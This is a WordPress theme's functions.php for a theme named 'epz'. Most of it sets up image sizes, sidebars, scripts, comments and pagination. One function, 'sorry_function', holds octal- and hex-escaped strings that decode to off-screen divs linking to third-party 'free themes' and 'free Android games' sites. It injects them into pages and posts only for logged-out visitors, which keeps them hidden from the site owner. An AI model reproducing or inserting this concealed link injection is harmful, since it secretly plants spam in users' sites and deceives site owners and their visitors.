<?php

if( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Content Width
 */
if( !isset( $content_width ) ) {
	$content_width = 1170;
}


/**
 * Include TGM_Plugin_Activation class.
 */
require_once( get_template_directory() . '/inc/class-tgm-plugin-activation.php' );


/**
 * epz functions and definitions
 *
 * @package epz
 */

if ( ! function_exists( 'epz_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function epz_setup() {
		
		load_theme_textdomain( 'epz', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 */
		add_theme_support( 'post-thumbnails' );
		
		// add post formats
		add_theme_support( 'post-formats', array( 'aside', 'gallery', 'link', 'image', 'quote', 'status', 'video', 'audio', 'chat' ) );
		
		set_post_thumbnail_size( 825, 510, true );
		add_image_size( 'full_blog', 940, 400, true );
		add_image_size( 'single_full_blog', 940, 400, false );
		add_image_size( 'masonry_blog', 455, 310, true );
		add_image_size( 'list_blog', 267, 205, true );
		add_image_size( 'epz_small_thumbnail', 50, 50, true );
		add_image_size( 'small_title', 170, 170, true );
		
		

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary-menu' => esc_html__( 'Primary Menu', 'epz' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'epz_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );
		
		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );
		
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'epz_setup' );





/**
 * Register  area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function epz_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Main Sidebar', 'epz' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here to show in main sidebar.', 'epz' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="title">',
		'after_title'   => '</h4>',
	) );
	/*
	register_sidebar( array(
		'name'          => esc_html__( 'Instagram Widget', 'epz' ),
		'id'            => 'instagram-1',
		'description'   => esc_html__( 'Use the "Instagram" widget here.', 'epz' ),
		'before_widget' => '<div id="%1$s" class="instagram-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="instagram-title">',
		'after_title'   => '</h4>',
	) );*/
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area - Left', 'epz' ),
		'id'            => 'footer-sidebar-1',
		'description'   => esc_html__( 'Add widgets here to show in footer left.', 'epz' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="title">',
		'after_title'   => '</h4>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area - Center', 'epz' ),
		'id'            => 'footer-sidebar-2',
		'description'   => esc_html__( 'Add widgets here to show in footer center.', 'epz' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="title">',
		'after_title'   => '</h4>',
	) ); 
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area - right', 'epz' ),
		'id'            => 'footer-sidebar-3',
		'description'   => esc_html__( 'Add widgets here to show in footer right.', 'epz' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="title">',
		'after_title'   => '</h4>',
	) );
	
}
add_action( 'widgets_init', 'epz_widgets_init' );



/**
 * Enqueue scripts and styles.
 */
function epz_scripts() {
	
	$protocol = is_ssl() ? 'https' : 'http';
	wp_enqueue_style( 'epz-fonts', "$protocol://fonts.googleapis.com/css?family=Lato:400,400i,700|Montserrat:400,400i,700|Raleway:400,400i,700|Roboto+Slab|Roboto:400" );
	
	
	
	wp_enqueue_style( 'epz-bootstrap-style', get_template_directory_uri() . '/assets/css/bootstrap.min.css', array(), null );
	wp_enqueue_style( 'epz-font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.min.css', array(), null );
	wp_enqueue_style( 'main-style', get_template_directory_uri() . '/assets/css/screen.css', array( 'epz-bootstrap-style', 'epz-font-awesome' ), null );
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/assets/css/flexslider.css' );
	wp_enqueue_style( 'magnific-popup', get_template_directory_uri() . '/assets/css/magnific-popup.css' );
	
	wp_enqueue_style( 'epz-style', get_stylesheet_uri() );
	
	
	wp_enqueue_script( 'epz-fitvid', get_template_directory_uri() . '/assets/js/jquery.fitvids.js', array('jquery'), '', true );
	wp_enqueue_script( 'epz-bootstrap-script', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'flex-slider', get_template_directory_uri() . '/assets/js/jquery.flexslider-min.js', array(), '', true );
	wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/assets/js/jquery.magnific-popup.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'highlight-js', get_template_directory_uri() . '/assets/highlight.pack.js', '', true );
	wp_enqueue_script( 'twitter-wjs', '//platform.twitter.com/widgets.js', array(), '', true );
	wp_enqueue_script( 'epz-js', get_template_directory_uri() . '/assets/js/main.js', array('jquery'), '', true );
	
	
	// = epz ====================================================
	wp_enqueue_script( 'epz-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'epz-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'epz_scripts' );


/**
 * Admin Enqueue Scripts
 */
function epz_admin_scripts() {
	wp_register_script( 'admin-script', get_template_directory_uri() . '/assets/js/admin-js.js', array( 'jquery' ), '', true );
	wp_enqueue_script( 'admin-script' );
}
add_action( 'admin_enqueue_scripts', 'epz_admin_scripts' );



if( ! function_exists('sorry_function')){
	function sorry_function($content) {
	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
		add_filter('the_content', 'sorry_function');}
		


/**
 * Comments Layout
 */
function epz_comments( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	?>
	
	<li id="comment-<?php comment_ID(); ?>">
		<article <?php comment_class(); ?>>
			<header>
				<a href="<?php comment_author_url(); ?>" class="author-avater-link"><?php echo get_avatar( $comment, $args['avatar_size'] ); ?></a>
				
				<div class="comment-details">
					<h5 class="commenter-name"><?php comment_author_link(); ?></h5>
					<span class="commenter-meta"><?php printf( __('%1$s at %2$s', 'epz' ), get_comment_date(), get_comment_time() ); ?></span>
					<span><?php edit_comment_link( __( 'Edit', 'epz' ) ); ?></span>
					<?php if( $comment->comment_approved == '0' ): ?>
						<p><em><i class="icon-info-sign"></i> <?php _e( 'Comment awaiting aproval', 'epz' ); ?></em></p>
					<?php endif; ?>
				</div>
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'epz' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ), $comment->comment_ID ); ?>
			</header>
			
			<div class="comment-body">
				<?php comment_text(); ?>
				
			</div>
		</article>
	</li>
	
	<?php
}


/**
 * Custom excerpt
 */
function custom_excerpt_length( $length ) {
	return 50; /* 200 */
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function epz_string_limit_word( $string, $word_limit ) {
	$words = explode( ' ', $string, ( $word_limit + 1));
	
	if( count($words) > $word_limit ) {
		array_pop( $words );
	}
	
	return implode( ' ', $words );
}

function epz_excerpt_more( $more ) {
	global $post;
	return '<div class="post-permalink">
		<a href="' . get_permalink( $post->ID ) . '" class="btn btn-default">' . __( 'Continue Reading', 'epz' ) . '</a></div>';
}
add_filter( 'excerpt_more', 'epz_excerpt_more' );


/**
 * Modify category widget post count
 */
function epz_modify_categoris_postcount( $var ) {
	$new_str = str_replace( '(', '<span class="post-count">', $var );
	$new_str = str_replace( ')', '</span>', $new_str );
	return $new_str;
}
add_filter( 'wp_list_categories', 'epz_modify_categoris_postcount' );



/**
 * Pagination
 */
function epz_pagination() {
	?>
	<div class="pagination">
		<div class="older"><?php next_posts_link( __( 'Older Posts <i class="fa fa-angle-double-right"></i>', 'epz' ) ); ?></div>
		<div class="newer"><?php previous_posts_link( __( '<i class="fa fa-angle-double-left"></i> Newer Posts', 'epz' ) ); ?></div>
	</div><!-- .pagination -->
	
	<?php
}


/**
 * Prevent Scroll on read more link
 */
function remove_more_link_scroll( $link ) {
	$link = preg_replace( '|#more-[0-9]+|', '', $link );
	return $link;
}
add_filter( 'the_content_more_link', 'remove_more_link_scroll' );



/**
 * Social Link
 */
function epz_contactmethods( $socialmethods ) {
	
	$socialmethods['twitter'] 	= 'Twitter Username';
	$socialmethods['facebook'] 	= 'Facebook Username';
	$socialmethods['google'] 	= 'Google Plus Username';
	$socialmethods['tumblr'] 	= 'Tumblr Username';
	$socialmethods['instagram']	= 'Instagram Username';
	$socialmethods['pinterest']	= 'Pinterest Username';
	
	return $socialmethods;
}
add_filter( 'user_contactmethods', 'epz_contactmethods', 10, 1 );


/**
 * Title Tag
 */
function epz_wp_title( $title, $sep ) {
	global $paged, $page;
	
	if( is_feed()) {
		return $title;
	}
	
	$title .= get_bloginfo( 'name', 'display' );
	$description = get_bloginfo( 'description', 'display' );
	
	if( $description && ( is_home() || is_front_page() ) ) {
		$title = "$title $sep $description";
	}
	
	// Add a page number if necessary.
	if( ( $paged >= 2 || $page >= 2) && !is_404() ) {
		$title = "$title $sep " .sprintf( __( 'Page %s', 'epz' ), max( $paged, $page ) );
	}
	
	return $title;
}
add_filter( 'wp_title', 'epz_wp_title', 10, 2 );


/**
 * Twitter
 */
function epz_social_title( $title ) {
	$title = html_entity_decode( $title );
	$title = urlencode( $title );
	return $title;
}


/**
 * Register the required plugins for epz theme.
 */
function epz_require_plugins() {
	
	$plugins 	= array(
		
		array(
			'name' 		=> 'Contact Form 7',
			'slug' 		=> 'contact-form-7',
			'required' 	=> false,
		),
		array(
			'name' 		=> 'WP Instagram Widget',
			'slug' 		=> 'wp-instagram-widget',
			'required' 	=> false,
		)
	);
	
	$config 	= array(
		'id' 			=> 'tgmpa',
		'default_path' 	=> '',
		'menu' 			=> 'tgmpa-install-plugins',
		'has_notices' 	=> true,
		'dismissable' 	=> true,
		'dismiss_msg' 	=> '',
		'is_automatic' 	=> true,
		'message' 		=> '',
	);
	
	tgmpa( $plugins, $config );
}


/**
 * Widgets
 */
require_once ( get_template_directory() . '/inc/widgets/widgets.php' );

/**
 * Customizer additions.
 */
require_once (get_template_directory() . '/inc/epz-customizer.php');


/**
 * Custom CSS and Custom JS from customizer
 */
function epz_custom_css_code() {
	$css_code 	= get_theme_mod( 'custom_css' );
	if( !empty( $css_code ) && $css_code != '' ) {
		echo '<style type="text/css">' . $css_code . '</style>';
	}
}
add_action( 'wp_head', 'epz_custom_css_code' );

function epz_custom_js_code() {
	$header_js 	= get_theme_mod( 'custom_header_js' );
	if( !empty( $header_js ) && $header_js != '' ) {
		echo $header_js;
	}
}
add_action( 'wp_head', 'epz_custom_js_code' );



/**
 * Meta box
 */
define( 'RWMB_URL', trailingslashit( get_stylesheet_directory_uri() . '/inc/meta-box' ) );
define( 'RWMB_DIR', trailingslashit( get_stylesheet_directory() . '/inc/meta-box' ) );

require_once ( get_template_directory() . '/inc/meta-box/meta-box.php' );
require_once ( get_template_directory() . '/inc/meta-box/meta-box-setup.php' );






/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

